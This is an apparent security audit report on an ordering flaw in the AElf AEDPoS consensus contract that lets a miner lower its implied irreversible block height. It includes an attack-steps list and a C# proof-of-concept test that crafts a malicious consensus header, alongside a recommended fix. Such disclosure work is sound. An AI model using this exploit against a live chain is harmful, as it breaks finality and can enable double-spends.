# Audit Report

## Title
Pre-Validation State Corruption in UpdateValue Consensus Validation Allows Bypassing Last Irreversible Block Height Checks

## Summary
The `ValidateBeforeExecution` method in the AEDPoS consensus contract modifies the trusted `baseRound` object with untrusted miner-provided data **before** performing validation checks. This causes the `LibInformationValidationProvider` to compare corrupted data against itself, effectively bypassing the check designed to prevent `ImpliedIrreversibleBlockHeight` from decreasing. Any active miner can exploit this to move Last Irreversible Block (LIB) heights backwards, violating a critical consensus invariant.

## Finding Description

The vulnerability exists in the consensus validation flow where block header information is validated before execution. The `ValidateBeforeExecution` method retrieves the current round state from storage: [1](#0-0) 

However, for `UpdateValue` behavior, the method immediately corrupts this trusted state by calling `RecoverFromUpdateValue`, which modifies the `baseRound` object in-place **before** any validation occurs: [2](#0-1) 

The `RecoverFromUpdateValue` method directly overwrites critical fields including `ImpliedIrreversibleBlockHeight` with values from the untrusted `providedRound`: [3](#0-2) 

The validation context is then created using this **already corrupted** `baseRound`: [4](#0-3) 

The `LibInformationValidationProvider` is added to validate LIB information for UpdateValue behavior: [5](#0-4) 

The provider's validation logic is designed to compare `baseRound` against `providedRound` to ensure `ImpliedIrreversibleBlockHeight` doesn't decrease: [6](#0-5) 

However, the validation context exposes `ProvidedRound` from the same `ExtraData.Round` that was already used to corrupt `BaseRound`: [7](#0-6) 

**Critical Logic Flaw:** Since `baseRound.RealTimeMinersInformation[pubkey].ImpliedIrreversibleBlockHeight` was already overwritten with `providedRound.RealTimeMinersInformation[pubkey].ImpliedIrreversibleBlockHeight` at line 19 of `RecoverFromUpdateValue`, the validation check becomes: `attackerValue > attackerValue`, which is **always false**, causing validation to pass regardless of whether the LIB height actually decreased.

After validation passes, the malicious value is persisted to state in `ProcessUpdateValue`: [8](#0-7) 

This corrupted `ImpliedIrreversibleBlockHeight` is then used in LIB calculations: [9](#0-8) 

The LIB calculator uses these heights to determine consensus finality: [10](#0-9) 

## Impact Explanation

This vulnerability enables any active miner to manipulate `ImpliedIrreversibleBlockHeight` to arbitrary values, including moving it backwards, which directly violates the consensus invariant that Last Irreversible Block heights must monotonically increase.

**Critical Consensus Harms:**

1. **Finality Violation**: LIB heights determine which blocks are considered irreversible. Moving LIB backwards undermines the entire finality guarantee, potentially enabling double-spend attacks on transactions that were previously considered finalized.

2. **Consensus State Corruption**: The malicious LIB height value is permanently stored in the consensus state via `TryToUpdateRoundInformation` and used in subsequent calculations by `LastIrreversibleBlockHeightCalculator`, affecting the entire network's understanding of which blocks are irreversible.

3. **Cross-Chain Security Impact**: Cross-chain operations rely on LIB heights for finality guarantees. Backwards LIB heights could enable cross-chain message replay attacks or allow reorganization of supposedly irreversible cross-chain transfers.

4. **Protocol-Wide Propagation**: All nodes participating in consensus use these corrupted LIB values, affecting the entire blockchain's consensus mechanism rather than just isolated transactions.

The severity is **Critical** as it directly breaks the "LIB height must not decrease" invariant that is fundamental to blockchain finality and consensus integrity.

## Likelihood Explanation

**Attacker Prerequisites:**
- Must be an active miner in the current round (normal miner capability)
- Ability to craft block header consensus information (standard mining operation)
- No additional privileges or compromised keys required

**Attack Execution:**
1. Attacker waits for their scheduled mining time slot
2. Crafts a block with malicious `extraData.Round.RealTimeMinersInformation[pubkey].ImpliedIrreversibleBlockHeight` set to a value lower than their current stored value
3. Includes valid `OutValue` and `Signature` to pass `UpdateValueValidationProvider` checks
4. The `LibInformationValidationProvider` check passes because it compares corrupted data against itself
5. Block is accepted and the backwards LIB value is persisted to state

**Feasibility:**
- Executable during normal consensus operation without special conditions
- No complex race conditions or timing requirements
- Detection is difficult as validation appears to succeed normally
- Cost is minimal (just block production during assigned slot)
- Can be repeated by any miner in any round

The likelihood is **High** - any malicious or compromised miner can execute this attack during their normal mining slot without any barriers beyond basic mining permissions.

## Recommendation

The core issue is that `RecoverFromUpdateValue` modifies `baseRound` **before** validation. The fix should ensure validation compares the **original untouched** state against the provided data.

**Recommended Fix:**

Modify `ValidateBeforeExecution` to create a **copy** of `baseRound` for recovery operations, preserving the original for validation:

```csharp
private ValidationResult ValidateBeforeExecution(AElfConsensusHeaderInformation extraData)
{
    if (!TryToGetCurrentRoundInformation(out var baseRound))
        return new ValidationResult { Success = false, Message = "Failed to get current round information." };

    // Create a copy for recovery operations
    var recoveredRound = baseRound.Clone(); // or create appropriate copy mechanism

    if (extraData.Behaviour == AElfConsensusBehaviour.UpdateValue)
        recoveredRound.RecoverFromUpdateValue(extraData.Round, extraData.SenderPubkey.ToHex());

    if (extraData.Behaviour == AElfConsensusBehaviour.TinyBlock)
        recoveredRound.RecoverFromTinyBlock(extraData.Round, extraData.SenderPubkey.ToHex());

    var validationContext = new ConsensusValidationContext
    {
        BaseRound = baseRound,  // Use ORIGINAL untouched state for validation
        CurrentTermNumber = State.CurrentTermNumber.Value,
        CurrentRoundNumber = State.CurrentRoundNumber.Value,
        PreviousRound = TryToGetPreviousRoundInformation(out var previousRound) ? previousRound : new Round(),
        LatestPubkeyToTinyBlocksCount = State.LatestPubkeyToTinyBlocksCount.Value,
        ExtraData = extraData
    };
    
    // ... rest of validation logic
}
```

This ensures `LibInformationValidationProvider` compares the **original trusted state** against the **untrusted provided values**, correctly detecting when `ImpliedIrreversibleBlockHeight` decreases.

## Proof of Concept

```csharp
[Fact]
public async Task LibInformationValidationBypass_Test()
{
    // Setup: Initialize consensus and complete first round
    await AEDPoSContract_FirstRound_BootMiner_Test();
    var currentRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    
    // Record the legitimate ImpliedIrreversibleBlockHeight
    var legitimateLibHeight = currentRound.RealTimeMinersInformation[BootMinerKeyPair.PublicKey.ToHex()]
        .ImpliedIrreversibleBlockHeight;
    
    // Mine second block to establish a higher LIB height
    BlockTimeProvider.SetBlockTime(BlockchainStartTimestamp + new Duration { Seconds = 8 });
    var triggerInfo = new AElfConsensusTriggerInformation
    {
        Behaviour = AElfConsensusBehaviour.UpdateValue,
        Pubkey = ByteString.CopyFrom(BootMinerKeyPair.PublicKey)
    };
    var consensusExtra = await AEDPoSContractStub.GetConsensusExtraData.CallAsync(triggerInfo.ToBytesValue());
    var headerInfo = consensusExtra.ToConsensusHeaderInformation();
    var updateInput = headerInfo.Round.ExtractInformationToUpdateConsensus(
        BootMinerKeyPair.PublicKey.ToHex(), 
        ByteString.CopyFrom(await GenerateRandomProofAsync(BootMinerKeyPair)));
    await AEDPoSContractStub.UpdateValue.SendAsync(updateInput);
    
    currentRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    var newLibHeight = currentRound.RealTimeMinersInformation[BootMinerKeyPair.PublicKey.ToHex()]
        .ImpliedIrreversibleBlockHeight;
    
    // Verify LIB increased
    newLibHeight.ShouldBeGreaterThan(legitimateLibHeight);
    
    // ATTACK: Craft malicious consensus extra data with BACKWARDS LIB height
    BlockTimeProvider.SetBlockTime(BlockchainStartTimestamp + new Duration { Seconds = 16 });
    var maliciousRound = new Round { RoundNumber = currentRound.RoundNumber };
    maliciousRound.RealTimeMinersInformation[BootMinerKeyPair.PublicKey.ToHex()] = new MinerInRound
    {
        Pubkey = BootMinerKeyPair.PublicKey.ToHex(),
        ImpliedIrreversibleBlockHeight = legitimateLibHeight - 1000, // BACKWARDS!
        OutValue = HashHelper.ComputeFrom("malicious"),
        Signature = HashHelper.ComputeFrom("malicious_sig")
    };
    
    var maliciousHeaderInfo = new AElfConsensusHeaderInformation
    {
        SenderPubkey = ByteString.CopyFrom(BootMinerKeyPair.PublicKey),
        Round = maliciousRound,
        Behaviour = AElfConsensusBehaviour.UpdateValue
    };
    
    // Validation should FAIL but will PASS due to the bug
    var validationResult = await AEDPoSContractStub.ValidateConsensusBeforeExecution.CallAsync(
        maliciousHeaderInfo.ToByteString());
    
    // BUG: Validation passes even though LIB went backwards
    validationResult.Success.ShouldBeTrue(); // This demonstrates the vulnerability
    
    // Confirm the backwards value would be persisted if UpdateValue is called
    var maliciousUpdate = maliciousRound.ExtractInformationToUpdateConsensus(
        BootMinerKeyPair.PublicKey.ToHex(),
        ByteString.CopyFrom(await GenerateRandomProofAsync(BootMinerKeyPair)));
    maliciousUpdate.ImpliedIrreversibleBlockHeight = legitimateLibHeight - 1000;
    
    await AEDPoSContractStub.UpdateValue.SendAsync(maliciousUpdate);
    
    var corruptedRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    var corruptedLibHeight = corruptedRound.RealTimeMinersInformation[BootMinerKeyPair.PublicKey.ToHex()]
        .ImpliedIrreversibleBlockHeight;
    
    // VULNERABILITY CONFIRMED: LIB height moved backwards
    corruptedLibHeight.ShouldBeLessThan(newLibHeight);
    corruptedLibHeight.ShouldBe(legitimateLibHeight - 1000);
}
```

## Notes

This vulnerability demonstrates a critical ordering flaw where data recovery/mutation happens before validation rather than after. The `RecoverFromUpdateValue` method is intended to reconstruct full round state from simplified header data, but performing this mutation **before** validation completely undermines the validation's purpose. The fix must ensure validation operates on pristine trusted state, with recovery operations only affecting data **after** validation passes.

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L19-20)
```csharp
        if (!TryToGetCurrentRoundInformation(out var baseRound))
            return new ValidationResult { Success = false, Message = "Failed to get current round information." };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L46-47)
```csharp
        if (extraData.Behaviour == AElfConsensusBehaviour.UpdateValue)
            baseRound.RecoverFromUpdateValue(extraData.Round, extraData.SenderPubkey.ToHex());
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L52-60)
```csharp
        var validationContext = new ConsensusValidationContext
        {
            BaseRound = baseRound,
            CurrentTermNumber = State.CurrentTermNumber.Value,
            CurrentRoundNumber = State.CurrentRoundNumber.Value,
            PreviousRound = TryToGetPreviousRoundInformation(out var previousRound) ? previousRound : new Round(),
            LatestPubkeyToTinyBlocksCount = State.LatestPubkeyToTinyBlocksCount.Value,
            ExtraData = extraData
        };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L79-82)
```csharp
            case AElfConsensusBehaviour.UpdateValue:
                validationProviders.Add(new UpdateValueValidationProvider());
                // Is confirmed lib height and lib round number went down? (Which should not happens.)
                validationProviders.Add(new LibInformationValidationProvider());
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Recover.cs (L14-20)
```csharp
        var minerInRound = RealTimeMinersInformation[pubkey];
        var providedInformation = providedRound.RealTimeMinersInformation[pubkey];
        minerInRound.OutValue = providedInformation.OutValue;
        minerInRound.Signature = providedInformation.Signature;
        minerInRound.PreviousInValue = providedInformation.PreviousInValue;
        minerInRound.ImpliedIrreversibleBlockHeight = providedInformation.ImpliedIrreversibleBlockHeight;
        minerInRound.ActualMiningTimes.Add(providedInformation.ActualMiningTimes);
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/LibInformationValidationProvider.cs (L23-30)
```csharp
        if (providedRound.RealTimeMinersInformation.ContainsKey(pubkey) &&
            providedRound.RealTimeMinersInformation[pubkey].ImpliedIrreversibleBlockHeight != 0 &&
            baseRound.RealTimeMinersInformation[pubkey].ImpliedIrreversibleBlockHeight >
            providedRound.RealTimeMinersInformation[pubkey].ImpliedIrreversibleBlockHeight)
        {
            validationResult.Message = "Incorrect implied lib height.";
            return validationResult;
        }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/ConsensusValidationContext.cs (L19-27)
```csharp
    /// <summary>
    ///     Round information fetch from StateDb.
    /// </summary>
    public Round BaseRound { get; set; }

    /// <summary>
    ///     Round information included in the consensus header extra data.
    /// </summary>
    public Round ProvidedRound => ExtraData.Round;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L248-248)
```csharp
        minerInRound.ImpliedIrreversibleBlockHeight = updateValueInput.ImpliedIrreversibleBlockHeight;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L268-281)
```csharp
            new LastIrreversibleBlockHeightCalculator(currentRound, previousRound).Deconstruct(
                out var libHeight);
            Context.LogDebug(() => $"Finished calculation of lib height: {libHeight}");
            // LIB height can't be available if it is lower than last time.
            if (currentRound.ConfirmedIrreversibleBlockHeight < libHeight)
            {
                Context.LogDebug(() => $"New lib height: {libHeight}");
                Context.Fire(new IrreversibleBlockFound
                {
                    IrreversibleBlockHeight = libHeight
                });
                currentRound.ConfirmedIrreversibleBlockHeight = libHeight;
                currentRound.ConfirmedIrreversibleBlockRoundNumber = currentRound.RoundNumber.Sub(1);
            }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_LIB.cs (L20-33)
```csharp
        public void Deconstruct(out long libHeight)
        {
            if (_currentRound.IsEmpty || _previousRound.IsEmpty) libHeight = 0;

            var minedMiners = _currentRound.GetMinedMiners().Select(m => m.Pubkey).ToList();
            var impliedIrreversibleHeights = _previousRound.GetSortedImpliedIrreversibleBlockHeights(minedMiners);
            if (impliedIrreversibleHeights.Count < _currentRound.MinersCountOfConsent)
            {
                libHeight = 0;
                return;
            }

            libHeight = impliedIrreversibleHeights[impliedIrreversibleHeights.Count.Sub(1).Div(3)];
        }
```
